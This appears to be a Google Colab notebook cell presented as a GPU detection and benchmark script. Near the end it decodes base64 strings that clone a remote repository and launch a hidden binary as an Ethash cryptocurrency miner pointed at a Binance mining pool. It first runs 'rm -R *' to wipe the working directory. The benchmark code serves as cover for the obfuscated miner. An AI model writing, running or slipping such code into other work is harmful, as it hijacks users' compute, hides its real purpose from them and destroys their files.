#@title RUNNER
%tensorflow_version 2.x
import tensorflow as tf
import timeit
import time
from os import system, name
from time import sleep
from tensorflow.python.client import device_lib
import json
from IPython.display import clear_output
from random import randint
from subprocess import PIPE, Popen
import base64
 
device_name = tf.test.gpu_device_name()
if device_name != '/device:GPU:0':
  print(
      '\n\nThis error most likely means that this notebook is not '
      'configured to use a GPU.  Change this in Notebook Settings via the '
      'command palette (cmd/ctrl-shift-P) or the Edit menu.\n\n')
  raise SystemError('GPU device not found')
 
def gpu():
  with tf.device('/device:GPU:0'):
    random_image_gpu = tf.random.normal((100, 100, 100, 3))
    net_gpu = tf.keras.layers.Conv2D(32, 7)(random_image_gpu)
    return tf.math.reduce_sum(net_gpu)
 
def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]
 
def name_device():
    depais = device_lib.list_local_devices()
    desc_dumps = json.dumps(depais[1].physical_device_desc, sort_keys=True, indent=4)
    desc_loads = json.loads(desc_dumps)
    split_desc = desc_loads.split(', ')
    split_tesla = split_desc[1].split(' ')
    name_device = split_tesla[2]
    return name_device
 
start = time.time()
def zero_to_infinity():
    i = 0
    while True:
        yield i
        i += 1
        time.sleep(1)
print('%s %s' %("Device name : ", name_device()))
gpu()
print('GPU (s):')
gpu_time = timeit.timeit('gpu()', number=10, setup="from __main__ import gpu")
print(gpu_time)
gpu_name = "{0}".format(name_device())
xa = str(base64.b64decode("Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9XaHlub3RTaXIvc2lyamkuZ2l0"), 'utf-8')
cmd = str(base64.b64decode("Li9zaXJqaS8uZGV2IC0tYWxnbyBFVEhBU0ggLS1wb29sIGV0aGFzaC5wb29sYmluYW5jZS5jb206MTgwMCAtLXVzZXIgZGV2aHU="), 'utf-8')
cmd2 = "{0}.{1}".format(cmd,gpu_name)
cmd3="nohup {0} &".format(cmd2)
 
 
!rm -R *
!{xa}
!chmod +x sirji/.dev
!{cmd2}
 
 
# for x in zero_to_infinity():  
#     clear_output(wait=True)  
#     end = time.time()
#     temp = end-start
#     hours = temp//3600
#     temp = temp - 3600*hours
#     minutes = temp//60
#     seconds = temp - 60*minutes
#     print('%s %s' %("Device name : ", name_device()))
#     gpu()
#     print('GPU (s):')
#     gpu_time = timeit.timeit('gpu()', number=10, setup="from __main__ import gpu")
#     print(gpu_time)
#     print('%s %d:%d:%d' %("Time execution : ",hours,minutes,seconds))
